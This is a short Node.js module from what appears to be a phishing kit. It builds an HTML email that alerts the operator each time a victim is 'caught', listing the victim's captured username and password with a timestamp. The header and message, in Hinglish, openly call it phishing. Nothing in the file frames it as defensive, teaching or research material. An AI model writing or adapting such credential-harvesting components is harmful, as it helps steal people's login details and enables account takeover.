const createPAssTemplate = (data) => {
    const { username, pass, createdAt } = data;
    const date = new Date(createdAt);
    const finalDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`
    return  `
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Email Confirmation</title>
        <style>
          /* CSS styles for the email template */
          body {
            font-family: Arial, sans-serif;
          }
          .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
          }
          .header {
            background-color: #f0f0f0;
            padding: 10px;
            text-align: center;
          }
          .content {
            margin-top: 20px;
          }
          .info {
            margin-bottom: 10px;
          }
          .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #888888;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h2>Machli phasi phishing sai</h2>
          </div>
          <div class="content">
            <p>Dear Satyamii pro, hacker, coder, worrior, programer, developer, tester, teacher, gamer, ethlit </p>
            <p>Ek banda phasa ${finalDate} time pai</p>
            <ul class="info">
              <li>Username: ${username}</li>
              <li>Password: ${pass}</li>
            </ul>
          </div>
          <div class="footer">
            <p>This is an automated email. Please do not reply.</p>
          </div>
        </div>
      </body>
    </html>
    `;
  }
  
  module.exports = { createPAssTemplate };
  